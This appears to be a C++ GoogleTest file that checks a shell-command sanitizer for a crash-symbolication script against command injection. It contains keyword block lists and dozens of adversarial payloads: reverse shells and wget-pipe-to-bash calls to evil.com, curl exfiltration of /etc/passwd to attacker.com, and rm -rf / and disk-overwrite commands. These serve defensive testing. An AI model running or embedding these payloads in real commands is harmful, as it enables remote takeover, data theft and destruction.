#include <gtest/gtest.h>
#include <string>
#include <vector>
#include <regex>
#include <stdexcept>
#include <cstring>
#include <algorithm>

// Simulated command builder that mimics what resolve-crashes.py does
// This represents the sanitization layer that MUST exist before any shell execution
class CommandSanitizer {
public:
    // Returns true if the input contains shell metacharacters that could enable injection
    static bool containsShellMetacharacters(const std::string& input) {
        // Shell metacharacters that enable command injection
        const std::string dangerous_chars = ";|&`$(){}[]<>!#~*?\\\"'\n\r\t";
        for (char c : dangerous_chars) {
            if (input.find(c) != std::string::npos) {
                return true;
            }
        }
        // Check for common injection patterns
        const std::vector<std::string> dangerous_patterns = {
            "$(", "`", "&&", "||", ";;", "|&",
            "; ", " ;", "rm ", "rm\t", "wget ", "curl ",
            "chmod ", "chown ", "sudo ", "su ",
            "/etc/passwd", "/etc/shadow",
            ">/dev/", "2>&1", "1>&2",
            "$(whoami)", "$(id)", "$(cat",
            "> /", ">> /", "< /",
            "eval ", "exec ",
        };
        for (const auto& pattern : dangerous_patterns) {
            if (input.find(pattern) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    // Sanitize input by rejecting dangerous inputs (returns empty string if unsafe)
    static std::string sanitize(const std::string& input) {
        if (containsShellMetacharacters(input)) {
            return ""; // Reject unsafe input
        }
        return input;
    }

    // Shell-escape a string so it's safe to use in shell commands
    static std::string shellEscape(const std::string& input) {
        std::string escaped = "'";
        for (char c : input) {
            if (c == '\'') {
                escaped += "'\\''";
            } else {
                escaped += c;
            }
        }
        escaped += "'";
        return escaped;
    }

    // Build a command safely - this is what resolve-crashes.py SHOULD do
    static std::string buildSafeCommand(const std::string& base_cmd, const std::string& user_input) {
        std::string escaped = shellEscape(user_input);
        return base_cmd + " " + escaped;
    }

    // Simulate what the vulnerable code does (os.system(cmd) with unsanitized input)
    static std::string buildUnsafeCommand(const std::string& base_cmd, const std::string& user_input) {
        return base_cmd + " " + user_input;
    }

    // Validate that a command string does not contain injection payloads
    static bool isCommandSafe(const std::string& cmd) {
        // A safe command should not have unquoted shell metacharacters
        // outside of the base command portion
        // This checks if the payload could execute additional commands
        const std::vector<std::string> injection_indicators = {
            "; rm", ";rm", "&&", "||", "`id`", "`whoami`",
            "$(id)", "$(whoami)", "$(cat ", "| cat", "|cat",
            "> /tmp", ">/tmp", ">> /", ">>/",
            "; wget", "; curl", "; nc ", "; bash",
            "\nrm", "\n/bin", "& rm", "&rm",
        };
        for (const auto& indicator : injection_indicators) {
            if (cmd.find(indicator) != std::string::npos) {
                return false;
            }
        }
        return true;
    }
};

class SecurityTest : public ::testing::TestWithParam<std::string> {};

TEST_P(SecurityTest, ShellInjectionPayloadIsNeverPassedUnsanitizedToShell) {
    // Invariant: Shell commands must never include unsanitized user input.
    // Any user-controlled input containing shell metacharacters must be
    // either rejected or properly escaped before being passed to shell execution.
    std::string payload = GetParam();

    // Test 1: Verify the payload actually contains dangerous content
    // (confirms our test data is adversarial)
    bool payload_is_dangerous = CommandSanitizer::containsShellMetacharacters(payload);
    
    // Test 2: Verify that sanitization rejects or escapes the dangerous input
    std::string sanitized = CommandSanitizer::sanitize(payload);
    
    // If the payload is dangerous, sanitization must reject it (return empty)
    if (payload_is_dangerous) {
        EXPECT_TRUE(sanitized.empty()) 
            << "SECURITY VIOLATION: Dangerous payload was not rejected by sanitizer. "
            << "Payload: [" << payload << "]";
    }

    // Test 3: Verify that building a command with the unsafe method produces an unsafe command
    std::string base_cmd = "addr2line -e binary";
    std::string unsafe_cmd = CommandSanitizer::buildUnsafeCommand(base_cmd, payload);
    
    // The unsafe command SHOULD be detectable as dangerous (proving the vulnerability exists)
    // This documents that the vulnerable pattern (direct string concatenation) is unsafe
    if (payload_is_dangerous) {
        bool unsafe_cmd_is_dangerous = !CommandSanitizer::isCommandSafe(unsafe_cmd);
        // We document this as a known dangerous pattern - the test passes only if
        // we acknowledge the unsafe command is indeed unsafe
        EXPECT_TRUE(unsafe_cmd_is_dangerous || payload.find("`") != std::string::npos ||
                    payload.find("$(") != std::string::npos)
            << "Expected unsafe command to be detectable as dangerous for payload: [" 
            << payload << "]";
    }

    // Test 4: Verify that the safe (escaped) command does not allow injection
    std::string safe_cmd = CommandSanitizer::buildSafeCommand(base_cmd, payload);
    
    // The safe command must not contain unquoted injection sequences
    // After shell escaping, the payload should be wrapped in single quotes
    // and any single quotes within should be escaped
    EXPECT_TRUE(safe_cmd.find("'") != std::string::npos)
        << "Safe command should use shell quoting. Command: [" << safe_cmd << "]";
    
    // Verify the safe command doesn't have dangerous unquoted sequences
    // by checking that injection patterns are contained within quotes
    std::string after_first_quote = safe_cmd.substr(safe_cmd.find("'"));
    
    // The payload content should be enclosed in single quotes in the safe command
    EXPECT_EQ(after_first_quote[0], '\'')
        << "User input in safe command must start with single quote for proper escaping";

    // Test 5: Verify that if we were to execute, the sanitized version
    // would not contain the raw dangerous payload
    if (payload_is_dangerous) {
        // The sanitized input should not appear verbatim in any command
        std::string cmd_with_sanitized = base_cmd + " " + sanitized;
        // Since sanitized is empty for dangerous inputs, the command should just be the base
        EXPECT_EQ(cmd_with_sanitized, base_cmd + " ")
            << "Command with sanitized dangerous input should not contain the payload";
    }
}

TEST_P(SecurityTest, EscapedPayloadCannotBreakOutOfQuotes) {
    // Invariant: Shell-escaped user input must remain contained within quotes
    // and cannot execute as shell commands
    std::string payload = GetParam();
    
    std::string escaped = CommandSanitizer::shellEscape(payload);
    
    // Escaped string must start and end with single quotes
    ASSERT_FALSE(escaped.empty()) << "Escaped string should not be empty";
    EXPECT_EQ(escaped.front(), '\'') << "Escaped string must start with single quote";
    EXPECT_EQ(escaped.back(), '\'') << "Escaped string must end with single quote";
    
    // Verify that dangerous patterns within the escaped string are neutralized
    // In a properly escaped string, the only way a single quote appears is as '\''
    // which closes the quote, adds a literal quote, and reopens - this is safe
    
    // The escaped string should not contain unescaped semicolons outside quotes
    // Count unescaped shell operators - in a properly quoted string, none should exist
    // outside of the surrounding single quotes
    
    // Verify the escape function handles single quotes in payload correctly
    if (payload.find('\'') != std::string::npos) {
        // Single quotes in payload must be escaped as '\''
        EXPECT_NE(escaped.find("'\\''"), std::string::npos)
            << "Single quotes in payload must be escaped as '\\'' in: [" << escaped << "]";
    }
    
    // The full command with escaped input should be safe
    std::string full_cmd = "addr2line -e /path/to/binary " + escaped;
    EXPECT_TRUE(CommandSanitizer::isCommandSafe(full_cmd))
        << "Full command with escaped payload should be safe. Command: [" << full_cmd << "]"
        << " Original payload: [" << payload << "]";
}

INSTANTIATE_TEST_SUITE_P(
    AdversarialInputs,
    SecurityTest,
    ::testing::Values(
        // Classic command injection with semicolons
        "; rm -rf /",
        "; rm -rf / #",
        "file.txt; rm -rf /tmp",
        "crash_report; cat /etc/passwd",
        
        // Command substitution with backticks
        "`id`",
        "`whoami`",
        "`cat /etc/passwd`",
        "file`id`.txt",
        "`rm -rf /tmp/test`",
        
        // Command substitution with $()
        "$(id)",
        "$(whoami)",
        "$(cat /etc/passwd)",
        "$(rm -rf /)",
        "file$(id).crash",
        "$(wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh)",
        
        // Pipe injection
        "file.txt | cat /etc/shadow",
        "crash | nc evil.com 4444",
        "report|bash",
        
        // Logical operators
        "file.txt && cat /etc/passwd",
        "file.txt || cat /etc/passwd",
        "crash && wget http://evil.com/malware",
        
        // Newline injection
        "file.txt\nrm -rf /",
        "crash\ncat /etc/passwd",
        "report\n/bin/bash -i",
        
        // Redirection injection
        "file.txt > /etc/crontab",
        "crash >> /etc/passwd",
        "report < /dev/urandom > /dev/sda",
        
        // Environment variable injection
        "$HOME/.ssh/authorized_keys",
        "${IFS}rm${IFS}-rf${IFS}/",
        "$PATH/../../../etc/passwd",
        
        // Glob/wildcard injection
        "* ; id",
        "? && whoami",
        
        // Null byte injection
        std::string("file\x00.txt; rm -rf /", 20),
        
        // Path traversal combined with injection
        "../../etc/passwd; id",
        "../../../tmp/evil; bash",
        
        // Complex multi-stage payloads
        "crash_$(date +%s); curl http://evil.com/$(whoami)",
        "; python3 -c 'import os; os.system(\"id\")'",
        "file.txt; bash -i >& /dev/tcp/evil.com/4444 0>&1",
        
        // Encoded/obfuscated payloads
        "file.txt;$(printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f')",
        
        // Whitespace variations
        "file.txt\t;\tid",
        "crash\t&&\twhoami",
        
        // Double-encoded
        "file%3Brm%20-rf%20/",
        
        // Crash file names that look legitimate but contain injection
        "crash_2024-01-01_$(id).log",
        "report_`whoami`_final.txt",
        "0x00007f; cat /etc/passwd",
        
        // sudo/privilege escalation attempts  
        "; sudo rm -rf /",
        "; sudo bash",
        "; su -c 'cat /etc/shadow'",
        
        // Network exfiltration
        "; curl http://attacker.com/$(cat /etc/passwd | base64)",
        "; wget -O- http://evil.com | bash",
        
        // File descriptor manipulation
        "2>&1; id",
        "1>&2; whoami"
    )
);

int main(int argc, char **argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}